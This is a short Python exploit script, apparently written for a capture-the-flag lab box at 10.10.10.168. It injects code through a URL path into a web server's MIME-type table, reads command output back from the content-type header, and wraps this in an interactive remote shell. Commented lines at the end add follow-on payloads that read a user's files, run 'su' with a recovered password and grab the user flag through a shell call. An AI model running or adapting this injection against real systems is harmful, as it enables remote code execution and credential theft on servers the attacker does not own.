# coding: utf-8
import os
import urllib.parse
import requests
import sys

RHOSTS = "10.10.10.168"
RPORT = "8080"

def quote_command(command):
    attack = "';MIMES['html']={};a='".format(command)
    path = urllib.parse.quote(attack)
    return path

def sanitize(response):
    response = response.split(",")
    response = list(map(lambda x: x.replace('\\n', ''),response))
    return "\n".join(response)

def command_to(command, RHOSTS, PORT):
    payload = quote_command(command)
    print("Payload : %s" % payload)
    requests.get("http://"+RHOSTS+":"+RPORT+"/"+payload)
    response = requests.get("http://"+RHOSTS+":"+RPORT+"/")
    response = response.headers['content-type']
    reset = quote_command("'text/html'")
    requests.get("http://"+RHOSTS+":"+RPORT+"/"+reset)
    return sanitize(response)

# One-shot command
# ./inject.py <command>
if len(sys.argv) > 1:
    command = sys.argv[1]
    print(command_to(command, RHOSTS, RPORT))
    exit()

# Interactive mode
print("Python shell to %s:%s" % (RHOSTS, RPORT))
print("type 'exit()' or 'exit' to quit.")
while True:
    command = input(">>> ")
    if command == "exit" or command == "exit()":
        exit()
    else:
        output = command_to(command, RHOSTS, RPORT)
        print(output)



# list_files_attack = "os.listdir('.')"
# read_file  = "open('/home/robert/check.txt','r').read()"
# user = "robert"
# password = "´ÑÈÌÉàÙÁÑé¯·¿k"
# log = "su - {} -p {}".format(user,password)
# user =  "cat /home/{}/user.txt".format(user)
# attack = "subprocess.check_output(['{}','{}'], shell=True).decode('utf8')".format(log,user)